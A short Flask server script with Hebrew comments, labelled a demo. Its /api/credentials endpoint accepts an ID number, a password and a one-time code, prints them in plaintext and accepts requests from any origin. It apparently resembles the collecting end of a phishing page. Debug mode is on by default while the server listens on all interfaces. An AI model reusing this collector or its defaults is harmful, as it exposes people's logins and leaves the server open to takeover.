import os
from flask import Flask, request, jsonify
from flask_cors import CORS
from dotenv import load_dotenv

# טוען את קובץ .env (אם קיים) ומוסיף את המשתנים ל־os.environ
load_dotenv()

app = Flask(__name__)
CORS(app)  # מאפשר גישה ל־API מכל מקור (Cross-Origin)

# אפשר להגדיר משתנים נוספים מתוך .env, אם תרצי
# למשל:
# SECRET_KEY = os.getenv("SECRET_KEY", "default_secret_key")
# app.config["SECRET_KEY"] = SECRET_KEY

@app.route("/", methods=["GET"])
def home():
    return jsonify({"message": "Demo server is running"}), 200

@app.route("/api/credentials", methods=["POST"])
def receive_credentials():
    """
    מצפה לקבל JSON עם שדות 'username' ו-'password'
    ואופציונלית 'otp'. מדפיס למסך ומחזיר JSON בחזרה.
    """
    data = request.get_json()
    if not data:
        return jsonify({"error": "No JSON payload received"}), 400

    id_number = data.get("id")
    password = data.get("password")
    code_value = data.get("code", None)  # אם אין שדה 'otp', יחזור None

    if not id_number or not password:
        return jsonify({"error": "Missing 'id' or 'password'"}), 400

    # הדפסת הערכים לקונסול לצורך בדיקה
    print(f"[Demo-Server] Received credentials → ID: {id_number}, Password: {password}, Code: {code_value}")

    return jsonify({"status": "success", "message": "Credentials received"}), 200

if __name__ == "__main__":
    # מוציאים את הערך של PORT מ־.env, ואם לא קיים, כברירת מחדל 5000
    port = int(os.getenv("SERVER_PORT", 5000))

    # בודקים האם DEBUG מופעל ב־.env (הערך "true" או "True")
    debug_env = os.getenv("DEBUG", "true").lower()
    debug_mode = debug_env in ("1", "true", "yes")

    # מריצים את השרת כשהוא מאזין על כל הכתובות (0.0.0.0) ועל הפורט שהגדרנו
    app.run(host="0.0.0.0", port=port, debug=debug_mode)